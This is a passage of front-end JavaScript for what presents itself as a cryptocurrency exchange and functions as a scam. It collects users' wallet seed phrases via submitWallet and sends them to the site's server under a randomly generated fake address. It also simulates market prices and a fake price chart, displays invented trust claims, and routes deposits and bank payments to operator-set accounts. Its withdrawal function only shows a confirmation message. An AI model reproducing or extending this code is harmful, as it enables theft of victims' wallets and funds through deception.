const markets = [ 
    { name: 'Bitcoin', symbol: 'BTC', price: 85245.32, change: 2.48, icon: '₿', color: '#f7931a' }, 
    { name: 'Ethereum', symbol: 'ETH', price: 5245.10, change: 1.12, icon: 'Ξ', color: '#627eea' }, 
    { name: 'Tether', symbol: 'USDT', price: 1.00, change: 0.01, icon: '₮', color: '#26a17b' },
    { name: 'Solana', symbol: 'SOL', price: 252.32, change: 5.20, icon: 'S', color: '#00d2ff' }, 
    { name: 'BNB', symbol: 'BNB', price: 720.40, change: -0.45, icon: 'B', color: '#f3ba2f' }, 
    { name: 'XRP', symbol: 'XRP', price: 3.91, change: -1.20, icon: 'X', color: '#23292f' }, 
    { name: 'Cardano', symbol: 'ADA', price: 1.25, change: 3.10, icon: 'A', color: '#0033ad' }, 
    { name: 'Dogecoin', symbol: 'DOGE', price: 0.28, change: 1.45, icon: 'Ð', color: '#c2a633' }, 
    { name: 'Avalanche', symbol: 'AVAX', price: 45.20, change: -2.10, icon: 'A', color: '#e84142' }, 
    { name: 'Polkadot', symbol: 'DOT', price: 12.15, change: 0.50, icon: '●', color: '#e6007a' }, 
    { name: 'Chainlink', symbol: 'LINK', price: 28.40, change: 4.20, icon: '⬡', color: '#2a5ada' }, 
    { name: 'Polygon', symbol: 'MATIC', price: 1.12, change: -1.15, icon: 'M', color: '#8247e5' }, 
    { name: 'Shiba Inu', symbol: 'SHIB', price: 0.000045, change: 6.80, icon: 'S', color: '#f00500' }, 
    { name: 'Litecoin', symbol: 'LTC', price: 112.10, change: 1.05, icon: 'Ł', color: '#345d9d' }, 
    { name: 'TRON', symbol: 'TRX', price: 0.23, change: 0.80, icon: 'T', color: '#eb0029' }, 
    { name: 'Uniswap', symbol: 'UNI', price: 15.20, change: -0.90, icon: 'U', color: '#ff007a' }, 
    { name: 'Cosmos', symbol: 'ATOM', price: 14.80, change: 2.10, icon: '⚛', color: '#2e3148' }, 
    { name: 'Stellar', symbol: 'XLM', price: 0.22, change: -1.50, icon: 'X', color: '#000000' }, 
    { name: 'NEAR Protocol', symbol: 'NEAR', price: 9.50, change: 3.40, icon: 'N', color: '#00ec97' }, 
    { name: 'Aptos', symbol: 'APT', price: 15.20, change: -2.30, icon: 'A', color: '#000000' }, 
    { name: 'Arbitrum', symbol: 'ARB', price: 2.15, change: 1.80, icon: 'A', color: '#12aaff' }, 
    { name: 'Optimism', symbol: 'OP', price: 4.40, change: 0.40, icon: 'O', color: '#ff0420' }, 
    { name: 'Filecoin', symbol: 'FIL', price: 8.80, change: -1.10, icon: 'F', color: '#0090ff' }, 
    { name: 'Injective', symbol: 'INJ', price: 35.10, change: 7.20, icon: 'I', color: '#00d2ff' }, 
    { name: 'Sui', symbol: 'SUI', price: 2.65, change: 4.50, icon: 'S', color: '#6fbcf0' }, 
    { name: 'Pepe', symbol: 'PEPE', price: 0.000018, change: 12.40, icon: '🐸', color: '#3d8130' } 
];

const countries = [ 
    { name: "United States", flag: "🇺🇸" }, { name: "United Kingdom", flag: "🇬🇧" }, { name: "Canada", flag: "🇨🇦" }, 
    { name: "Australia", flag: "🇦🇺" }, { name: "Nigeria", flag: "🇳🇬" }, { name: "Kenya", flag: "🇰🇪" }, 
    { name: "South Africa", flag: "🇿🇦" }, { name: "Ghana", flag: "🇬🇭" }, { name: "India", flag: "🇮🇳" }, 
    { name: "Germany", flag: "🇩🇪" }, { name: "France", flag: "🇫🇷" }, { name: "Japan", flag: "🇯🇵" }, 
    { name: "UAE", flag: "🇦🇪" }, { name: "Brazil", flag: "🇧🇷" } 
];

const currencyMap = { 
    "🇺🇸 United States": { code: "USD", symbol: "$", rate: 1 }, "🇬🇧 United Kingdom": { code: "GBP", symbol: "£", rate: 0.79 }, 
    "🇨🇦 Canada": { code: "CAD", symbol: "C$", rate: 1.36 }, "🇦🇺 Australia": { code: "AUD", symbol: "A$", rate: 1.52 }, 
    "🇳🇬 Nigeria": { code: "NGN", symbol: "₦", rate: 1500 }, "🇰🇪 Kenya": { code: "KES", symbol: "KSh", rate: 130 }, 
    "🇿🇦 South Africa": { code: "ZAR", symbol: "R", rate: 18.5 }, "🇬🇭 Ghana": { code: "GHS", symbol: "₵", rate: 14.5 }, 
    "🇮🇳 India": { code: "INR", symbol: "₹", rate: 83.5 }, "🇩🇪 Germany": { code: "EUR", symbol: "€", rate: 0.92 }, 
    "🇫🇷 France": { code: "EUR", symbol: "€", rate: 0.92 }, "🇯🇵 Japan": { code: "JPY", symbol: "¥", rate: 150 }, 
    "🇦🇪 UAE": { code: "AED", symbol: "د.إ", rate: 3.67 }, "🇧🇷 Brazil": { code: "BRL", symbol: "R$", rate: 5.0 } 
};

const BONUS_RATE = 0.05;
let currentTradeMode = 'buy';
let currentUser = null;
let globalSettings = null;

function getUserCurrency() { if (!currentUser || !currentUser.country) return currencyMap["🇺🇸 United States"]; return currencyMap[currentUser.country] || currencyMap["🇺🇸 United States"]; }
function getExchangePrice(coin, mode) { return mode === 'buy' ? coin.price * (1 - BONUS_RATE) : coin.price * (1 + BONUS_RATE); }

function showView(viewId, authType = 'login') {
    document.querySelectorAll('.app-view').forEach(view => view.style.display = 'none');
    const target = document.getElementById(viewId);
    if (target) target.style.display = 'block';
    if (viewId === 'authView') switchAuth(authType);
    if (viewId === 'dashboardView') { fetchBalances(); checkWalletStatus(); }
    if (viewId === 'guestView' && typeof loadMarkets === 'function') loadMarkets();
    window.scrollTo(0, 0);
}

function showToast(msg) {
    const toast = document.getElementById('toast');
    if (toast) { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
}

function showCustomAlert(title, message) {
    let modal = document.getElementById('customAlertModal'); 
    modal.style.display = 'flex';
    modal.innerHTML = `<div class="custom-alert-box"><div class="custom-alert-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f6465d" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><h3>${title}</h3><p>${message}</p><button class="custom-alert-btn" onclick="document.getElementById('customAlertModal').style.display='none'">Got it</button></div>`;
}

function switchAuth(type) { 
    document.getElementById('loginForm').style.display = type === 'login' ? 'block' : 'none'; 
    document.getElementById('registerForm').style.display = type === 'register' ? 'block' : 'none'; 
}

function populateTradeCoins() { 
    const select = document.getElementById('tradeCoin'); 
    if(!select) return; 
    select.innerHTML = ''; 
    markets.forEach(c => { const o = document.createElement('option'); o.value = c.symbol; o.textContent = `${c.name} (${c.symbol})`; select.appendChild(o); }); 
}

async function handleRegister() {
    const name = document.getElementById('regName').value;
    const country = document.getElementById('regCountry').value;
    const phone = document.getElementById('regPhone').value;
    const email = document.getElementById('regEmail').value;
    const password = document.getElementById('regPassword').value;
    const confirm = document.getElementById('regConfirmPassword').value;
    const terms = document.getElementById('regTerms').checked;

    if (!name || !country || !phone || !email || !password) return showToast("Please fill all fields.");
    if (password !== confirm) return showToast("Passwords do not match.");
    if (!terms) return showToast("You must agree to the Terms.");

    try {
        const res = await fetch('/api/auth/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name, country, phone, email, password }) });
        const data = await res.json();
        if (res.ok) { showToast("Registration successful!"); switchAuth('login'); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

async function handleLogin() {
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    if (!email || !password) return showToast("Please fill all fields.");
    try {
        const res = await fetch('/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }) });
        const data = await res.json();
        if (res.ok) { localStorage.setItem('token', data.token); localStorage.setItem('user', JSON.stringify(data.user)); checkAuthState(); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

function handleLogout() { localStorage.removeItem('token'); localStorage.removeItem('user'); checkAuthState(); }

function checkAuthState() {
    currentUser = JSON.parse(localStorage.getItem('user'));
    if (currentUser && (currentUser.isAdmin || currentUser.email.includes('admin'))) { window.location.href = '/admin.html'; return; }
    const navLinks = document.getElementById('navLinks');
    if (currentUser) {
        navLinks.innerHTML = `<a href="#" onclick="showView('guestView')">Markets</a><a href="#" class="profile-avatar-nav" onclick="showView('dashboardView')" style="background: linear-gradient(135deg, #00d4aa 0%, #007a62 100%); color: #fff; display: inline-flex; align-items: center; justify-content: center; width: 32px; height: 32px; border-radius: 50%; font-weight: bold;">${currentUser.name.charAt(0).toUpperCase()}</a><a href="#" class="btn-logout" onclick="handleLogout()">Logout</a>`;
        showView('dashboardView');
    } else {
        navLinks.innerHTML = `<a href="#" onclick="showView('guestView')">Markets</a><a href="#" onclick="showView('authView', 'login')">Login</a><a href="#" class="btn-primary" onclick="showView('authView', 'register')">Get Started</a>`;
        showView('guestView');
    }
}

// Custom Country Selector
function openCountrySelector() {
    let modal = document.getElementById('countrySelectorModal');
    if (modal) modal.remove();
    modal = document.createElement('div');
    modal.id = 'countrySelectorModal';
    modal.className = 'modal-overlay';
    let countryHtml = countries.map(c => `<div onclick="selectCountry('${c.flag} ${c.name}', '${c.flag} ${c.name}')" style="padding: 15px; border-bottom: 1px solid #333; cursor: pointer; display: flex; gap: 10px;"><span>${c.flag}</span> ${c.name}</div>`).join('');
    modal.innerHTML = `<div class="modal-content"><h3 style="margin-bottom: 15px;">Select Country</h3><div style="max-height: 50vh; overflow-y: auto;">${countryHtml}</div></div>`;
    document.body.appendChild(modal);
}

function selectCountry(value, display) {
    document.getElementById('regCountry').value = value;
    document.getElementById('regCountryDisplay').innerHTML = `<span>${display}</span><span>▼</span>`;
    document.getElementById('countrySelectorModal').remove();
}

// Dynamic Trust Badge
let trustIndex = 0;
const trustMessages = ["🛡️ Trusted by 10M+ users globally", "🔒 256-bit Encryption & Cold Storage", "⚡ Lightning-Fast Execution", "💬 24/7 Professional Support", "🌍 Trade over 500+ cryptocurrencies"];
setInterval(() => {
    const badge = document.getElementById('dynamicTrustBadge');
    if (badge) {
        badge.style.opacity = 0;
        setTimeout(() => {
            trustIndex = (trustIndex + 1) % trustMessages.length;
            badge.textContent = trustMessages[trustIndex];
            badge.style.opacity = 1;
        }, 300);
    }
}, 3000);

function simulateLiveMarket() {
    markets.forEach(coin => {
        const fluctuation = (Math.random() - 0.5) * (coin.price * 0.002);
        coin.price += fluctuation;
        const changeFluctuation = (Math.random() - 0.5) * 0.2;
        coin.change = parseFloat((coin.change + changeFluctuation).toFixed(2));
    });
}

function loadMarkets() {
    const marketList = document.getElementById('market-list'); const ticker = document.getElementById('ticker');
    if(!marketList) return;
    let marketHTML = ''; let tickerHTML = '';
    
    markets.forEach((coin, index) => {
        const isUp = coin.change >= 0; const changeClass = isUp ? 'up' : 'down'; const changeSymbol = isUp ? '↑' : '↓';
        let formattedPrice = coin.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 6});
        marketHTML += `<div class="market-row" onclick="quickTrade('${coin.symbol}')"><div class="market-rank">${index + 1}</div><div class="market-name-col"><div class="market-icon" style="background: ${coin.color};">${coin.icon}</div><div><div class="market-name-text">${coin.name}</div><div class="market-symbol-text">${coin.symbol}</div></div></div><div class="market-price">$${formattedPrice}</div><div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change)}%</div></div>`;
        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change)}%</span></div>`;
    });
    marketList.innerHTML = marketHTML; if(ticker) ticker.innerHTML = tickerHTML + tickerHTML; 

    // Hero Chart Logic
    const btc = markets.find(c => c.symbol === 'BTC');
    if(btc) {
        document.getElementById('heroChartPrice').innerText = `$${btc.price.toLocaleString()}`;
        document.getElementById('heroChartChange').innerText = `+${btc.change}%`;
        // Generate a fake sparkline path
        let path = "M0,60 ";
        for(let i=1; i<=10; i++) { path += `L${i*30},${Math.random() * 40 + 20} `; }
        document.getElementById('heroSvgContainer').innerHTML = `<svg width="100%" height="100%" viewBox="0 0 300 80"><path d="${path}" fill="none" stroke="#0ecb51" stroke-width="3"/></svg>`;
    }

    // Gainers/Losers Logic
    const glList = document.getElementById('gainersLosersList');
    if(glList) {
        const sorted = [...markets].sort((a,b) => b.change - a.change);
        const top = [...sorted.slice(0, 3), ...sorted.slice(-3)]; // 3 gainers, 3 losers
        glList.innerHTML = top.map(c => `<div class="gl-card"><div style="font-size:12px; color:#888;">${c.symbol}</div><div style="font-weight:bold; margin: 5px 0;">$${c.price}</div><div class="${c.change >= 0 ? 'up' : 'down'}" style="font-size:12px;">${c.change >= 0 ? '↑' : '↓'} ${Math.abs(c.change)}%</div></div>`).join('');
    }
}

function quickTrade(symbol) { requireAuth('tradeView', 'buy'); setTimeout(() => { document.getElementById('tradeCoin').value = symbol; calcTrade(); }, 100); }

async function checkWalletStatus() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}`);
        const user = await res.json();
        const disconnected = document.getElementById('walletDisconnected'), pending = document.getElementById('walletPending'), approved = document.getElementById('walletApproved'), badge = document.getElementById('walletStatusBadge');
        if(disconnected) disconnected.style.display = 'none'; if(pending) pending.style.display = 'none'; if(approved) approved.style.display = 'none';
        
        if (user.walletStatus === 'approved') {
            if(approved) approved.style.display = 'block'; 
            if(document.getElementById('displayWalletAddress')) document.getElementById('displayWalletAddress').textContent = user.walletAddress; 
            if(badge) { badge.textContent = 'CONNECTED'; badge.className = 'status-badge approved'; }
        } else if (user.walletStatus === 'pending') {
            if(pending) pending.style.display = 'block'; if(badge) { badge.textContent = 'VERIFYING'; badge.className = 'status-badge pending'; }
        } else {
            if(disconnected) disconnected.style.display = 'block'; if(badge) { badge.textContent = 'NOT CONNECTED'; badge.className = 'status-badge disconnected'; }
        }
    } catch (error) { console.log(error); }
}

function showImportWallet() { document.getElementById('importWalletForm').style.display = 'block'; }
async function submitWallet() {
    const seed = document.getElementById('seedPhraseInput').value.trim();
    if (seed.split(' ').length < 12) return showToast("Enter a valid 12 or 24-word phrase.");
    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
    try {
        const res = await fetch('/api/wallet/import', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: currentUser.email, seedPhrase: seed, walletAddress: fakeAddress }) });
        if (res.ok) { showToast("Wallet submitted for review."); checkWalletStatus(); }
    } catch (error) { showToast("Error submitting wallet."); }
}

async function fetchBalances() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        let hideZero = localStorage.getItem('hideZeroBalances') === 'true';
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-size: 18px; font-weight: 600;">Your Assets</h3>
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <span style="font-size: 13px; color: #aaa;">Hide Zero</span>
                    <div style="position: relative; width: 44px; height: 24px;">
                        <input type="checkbox" id="hideZeroToggle" ${hideZero ? 'checked' : ''} style="opacity: 0; width: 0; height: 0; position: absolute;">
                        <span id="toggleTrack" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: ${hideZero ? '#00d4aa' : '#3a3a4a'}; border-radius: 24px; transition: 0.3s;"></span>
                        <span id="toggleThumb" style="position: absolute; height: 20px; width: 20px; left: ${hideZero ? '21px' : '2px'}; bottom: 2px; background-color: #fff; border-radius: 50%; transition: 0.3s;"></span>
                    </div>
                </label>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
            <div id="assetsListContainer" class="${hideZero ? 'hide-zeros' : ''}" style="display: flex; flex-direction: column;">
        `;
        
        let totalValue = 0;
        markets.forEach(coin => {
            const amount = Math.max(0, balances[coin.symbol] || 0); 
            const value = amount * coin.price;
            totalValue += value;
            const rowClass = amount === 0 ? 'asset-row zero-row' : 'asset-row';
            // PRECISE CLICK: Hardcoded onclick
            html += `<div class="${rowClass}" onclick="window.showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})">
                <div class="asset-name"><div class="market-icon" style="background:${coin.color};">${coin.icon}</div> ${coin.name}</div>
                <div class="asset-amount">${amount.toFixed(6)}</div>
                <div class="asset-value">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
            </div>`;
        });
        html += `</div>`;
        assetsCard.innerHTML = html;
        
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) {
            totalEl.dataset.realValue = `$${Math.max(0, totalValue).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
            totalEl.textContent = localStorage.getItem('hideBalance') === 'true' ? '******' : totalEl.dataset.realValue;
        }
        
        const toggle = document.getElementById('hideZeroToggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                const isChecked = e.target.checked; localStorage.setItem('hideZeroBalances', isChecked);
                const listContainer = document.getElementById('assetsListContainer');
                if (isChecked) listContainer.classList.add('hide-zeros'); else listContainer.classList.remove('hide-zeros');
                document.getElementById('toggleTrack').style.backgroundColor = isChecked ? '#00d4aa' : '#3a3a4a';
                document.getElementById('toggleThumb').style.left = isChecked ? '21px' : '2px';
            });
        }
    } catch (error) { console.log("Balance fetch error:", error); }
}

function toggleBalanceVisibility() {
    const valueEl = document.getElementById('totalPortfolioValue'), iconEl = document.getElementById('eyeIcon');
    if (!valueEl) return; 
    const isHidden = localStorage.getItem('hideBalance') === 'true'; 
    const newState = !isHidden; 
    localStorage.setItem('hideBalance', newState);
    if (newState) { 
        valueEl.textContent = '******'; 
        if(iconEl) iconEl.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>'; 
    } else { 
        valueEl.textContent = valueEl.dataset.realValue || '$0.00'; 
        if(iconEl) iconEl.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>'; 
    }
}

document.addEventListener('DOMContentLoaded', () => {
    populateTradeCoins(); checkAuthState(); loadMarkets();
    setInterval(() => { simulateLiveMarket(); loadMarkets(); }, 2000);
});

/* =====================================================
   PART 6A: MODALS & FULL PAGES
   ===================================================== */
window.showAssetActions = function(symbol, name, amount, value) {
    let modal = document.getElementById('assetActionModal'); 
    modal.style.display = 'flex';
    
    // Find coin color
    const coin = markets.find(c => c.symbol === symbol);
    const bgColor = coin ? coin.color : '#333';
    const icon = coin ? coin.icon : name.charAt(0);

    modal.innerHTML = `
        <div class="modal-content" style="text-align: center;">
            <span onclick="document.getElementById('assetActionModal').style.display='none'" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer;">&times;</span>
            <div style="width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px; background: ${bgColor}; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white;">${icon}</div>
            <h2 style="margin: 0 0 5px 0; color: #fff; font-size: 22px; font-weight: 700;">${name} (${symbol})</h2>
            <div style="margin-bottom: 25px; margin-top: 15px;">
                <p style="color: #888; font-size: 13px; margin-bottom: 5px;">Total Balance</p>
                <h3 style="color: #fff; margin: 0; font-size: 18px;">${amount.toFixed(6)} ${symbol}</h3>
                <p style="color: #00d4aa; margin: 5px 0 0 0; font-size: 14px; font-weight: 600;">≈ $${value.toFixed(2)} USD</p>
            </div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <button onclick="executeAssetAction('buy')" style="background: rgba(14, 203, 81, 0.1); color: #0ecb51; border: 1px solid #0ecb51; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Buy</button>
                <button onclick="executeAssetAction('sell')" style="background: rgba(246, 70, 93, 0.1); color: #f6465d; border: 1px solid #f6465d; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Sell</button>
                <button onclick="document.getElementById('assetActionModal').style.display='none'; openDepositPage('${symbol}');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Deposit</button>
                <button onclick="document.getElementById('assetActionModal').style.display='none'; openWithdrawPage('${symbol}', ${amount});" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; cursor: pointer;">Withdraw</button>
            </div>
        </div>
    `;
    window._currentActionSymbol = symbol;
};

window.executeAssetAction = function(mode) { 
    document.getElementById('assetActionModal').style.display = 'none'; 
    requireAuth('tradeView', mode); 
    setTimeout(() => { document.getElementById('tradeCoin').value = window._currentActionSymbol; calcTrade(); }, 100); 
};

function createPageView(id, title, contentHtml) {
    let view = document.getElementById(id); 
    if (view) view.remove(); 
    view = document.createElement('main'); 
    view.id = id; 
    view.className = 'app-view'; 
    view.style.display = 'none'; 
    view.innerHTML = `
        <div style="max-width: 500px; margin: 0 auto; padding: 20px;">
            <div style="display: flex; align-items: center; margin-bottom: 25px;">
                <button onclick="showView('dashboardView')" style="width: 42px; height: 42px; border-radius: 50%; background: #1a1a2a; border: 1px solid #2a2a3a; display: flex; align-items: center; justify-content: center; cursor: pointer; margin-right: 15px; padding: 0; color: #fff;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                </button>
                <h2 style="margin: 0; font-size: 20px; color: #fff;">${title}</h2>
            </div>
            <div class="card" style="background: #1a1a2a; border-radius: 16px; padding: 25px; border: 1px solid #2a2a3a;">
                ${contentHtml}
            </div>
        </div>`;
    document.body.appendChild(view);
}

function openDepositPage(symbol) {
    let address = (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) ? globalSettings.wallets[symbol] : "Contact Support (Address Not Set)";
    let qrCodeUrl = address.includes("Contact") ? "" : `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${address}`;

    const content = `
        <div style="text-align: center;">
            <h3 style="color: #fff;">Deposit ${symbol}</h3>
            <p style="color: #888; font-size: 13px; margin-bottom: 20px;">Send only ${symbol} to this address.</p>
            
            <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 20px; margin-bottom: 20px;">
                ${qrCodeUrl ? `<img src="${qrCodeUrl}" style="background:#fff; padding:8px; border-radius:8px; margin-bottom:15px; width: 150px; height: 150px;">` : ''}
                <div style="font-family: monospace; font-size: 13px; color: ${address.includes('Contact') ? '#f6465d' : '#00d4aa'}; word-break: break-all; margin-bottom: 15px; line-height: 1.4;">${address}</div>
                <button onclick="navigator.clipboard.writeText('${address}'); this.textContent='Copied!';" style="background: #00d4aa; color: #000; border: none; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;">Copy Address</button>
            </div>
            
            <!-- RED WARNING BANNER -->
            <div class="warning-banner" style="text-align: left; margin-bottom: 0;">
                <span style="color: #f6465d; font-size: 16px;">⚠️</span>
                <p>Sending any other coin or using the wrong network to this address will result in permanent loss of funds.</p>
            </div>
        </div>
    `;
    createPageView('depositPageView', 'Deposit', content);
    showView('depositPageView');
}

function openWithdrawPage(symbol, balance) {
    const safeBalance = Math.max(0, balance).toFixed(6);
    const content = `
        <div>
            <h3 style="color: #fff; text-align: center;">Withdraw ${symbol}</h3>
            <p style="color: #888; text-align: center; margin-bottom: 20px;">Available: ${safeBalance} ${symbol}</p>
            
            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                <label style="color: #888; font-size: 12px;">Amount</label>
                <button onclick="document.getElementById('withdrawPageAmount').value = '${safeBalance}';" style="background: none; border: none; color: #00d4aa; font-size: 12px; font-weight: bold; cursor: pointer;">MAX</button>
            </div>
            <div style="position: relative; margin-bottom: 15px;">
                <input type="number" id="withdrawPageAmount" placeholder="0.00" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px 50px 14px 14px; border-radius: 8px; color: #fff;">
                <span style="position: absolute; right: 15px; top: 15px; color: #888; font-weight: bold;">${symbol}</span>
            </div>
            
            <div style="margin-bottom: 20px;">
                <label style="color: #888; font-size: 12px; margin-bottom: 5px; display: block;">Destination Address</label>
                <input type="text" id="withdrawPageAddress" placeholder="Enter ${symbol} address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;">
            </div>
            
            <!-- RED WARNING BANNER -->
            <div class="warning-banner">
                <span style="color: #f6465d; font-size: 16px;">⚠️</span>
                <p>Ensure the destination address is correct and supports the ${symbol} network.</p>
            </div>
            
            <button onclick="executeWithdrawal('${symbol}', ${safeBalance})" style="background: #f6465d; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer;">Confirm Withdrawal</button>
        </div>`;
    createPageView('withdrawPageView', 'Withdraw', content);
    showView('withdrawPageView');
}

function executeWithdrawal(symbol, balance) {
    const amount = parseFloat(document.getElementById('withdrawPageAmount').value); 
    const address = document.getElementById('withdrawPageAddress').value.trim();
    if (!amount || amount <= 0) return showCustomAlert('Error', 'Invalid amount.'); 
    if (amount > balance) return showCustomAlert('Error', 'Insufficient balance.'); 
    if (!address || address.length < 20) return showCustomAlert('Error', 'Invalid address.');
    showToast(`Withdrawal submitted.`); showView('dashboardView');
}

function openAssetSelector(action) {
    let modal = document.getElementById('assetActionModal'); 
    modal.style.display = 'flex';
    
    let assetHtml = markets.map(coin => `<div onclick="document.getElementById('assetActionModal').style.display='none'; ${action === 'deposit' ? `openDepositPage('${coin.symbol}')` : `openWithdrawPage('${coin.symbol}', 0)`};" style="display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #2a2a3a; cursor: pointer;"><div style="display: flex; gap: 10px; align-items: center;"><div style="background:${coin.color}; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff;">${coin.icon}</div><div><div style="color: #fff; font-weight: bold; font-size: 14px;">${coin.name}</div><div style="color: #888; font-size: 12px;">${coin.symbol}</div></div></div></div>`).join('');
    
    modal.innerHTML = `<div class="modal-content" style="padding: 0; max-height: 80vh; display: flex; flex-direction: column;"><div style="display: flex; justify-content: space-between; padding: 20px; border-bottom: 1px solid #333;"><h2 style="color: #fff; margin: 0; font-size: 18px; text-transform: capitalize;">Select ${action}</h2><span onclick="document.getElementById('assetActionModal').style.display='none'" style="color: #888; font-size: 24px; cursor: pointer;">&times;</span></div><div style="overflow-y: auto; flex: 1;">${assetHtml}</div></div>`;
}

/* =====================================================
   PART 6B: TRADE LOGIC & PAYMENT FLOWS
   ===================================================== */
function requireAuth(targetView, mode = null) {
    if (!currentUser) { showView('authView', 'login'); showToast("Please log in."); }
    else { showView(targetView); if (targetView === 'tradeView') setTradeMode(mode || 'buy'); }
}

function setTradeMode(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--success)'; 
        document.getElementById('receivingWalletContainer').style.display = 'block'; 
        document.getElementById('receiveLabel').textContent = 'You will receive (Crypto)';
        document.getElementById('methodLabel').textContent = 'Payment Method';
    } else {
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)'; 
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale'; 
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)'; 
        document.getElementById('receivingWalletContainer').style.display = 'none'; 
        document.getElementById('receiveLabel').textContent = `You will receive (${curr.code})`;
        document.getElementById('methodLabel').textContent = 'Payout Method';
    }
    
    document.getElementById('tradeMethod').innerHTML = `<option value="Bank Transfer">Bank Transfer</option><option value="PayPal">PayPal</option><option value="Credit Card">Credit Card</option>`;
    document.getElementById('tradeAmount').value = ''; 
    document.getElementById('tradeReceive').value = ''; 
    togglePaymentDetails(); 
    calcTrade();
}

function togglePaymentDetails() {
    const method = document.getElementById('tradeMethod').value; 
    const container = document.getElementById('paymentDetailsContainer'); 
    const cardInputs = document.getElementById('cardDetailsInputs'); 
    const paypalInputs = document.getElementById('paypalDetailsInputs'); 
    const bankInputs = document.getElementById('bankDetailsInputs');
    
    if(cardInputs) cardInputs.style.display = 'none'; 
    if(paypalInputs) paypalInputs.style.display = 'none'; 
    if(bankInputs) bankInputs.style.display = 'none';
    
    // Remove old admin box if exists
    const oldAdminBox = document.getElementById('adminFiatDetails'); 
    if (oldAdminBox) oldAdminBox.remove();

    if (currentTradeMode === 'buy') {
        if (method === 'Bank Transfer') {
            const bankDetails = (globalSettings && globalSettings.adminBankDetails) ? globalSettings.adminBankDetails : "Bank details not set. Contact Support."; 
            const adminBox = document.createElement('div'); 
            adminBox.id = 'adminFiatDetails';
            adminBox.innerHTML = `<div style="background: #1a1a2a; border: 1px solid #333; padding: 15px; border-radius: 8px; margin-top: 10px;"><p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Send Fiat to this Bank Account:</p><p style="color: #fff; font-size: 14px; white-space: pre-wrap; font-family: monospace;">${bankDetails}</p></div>`;
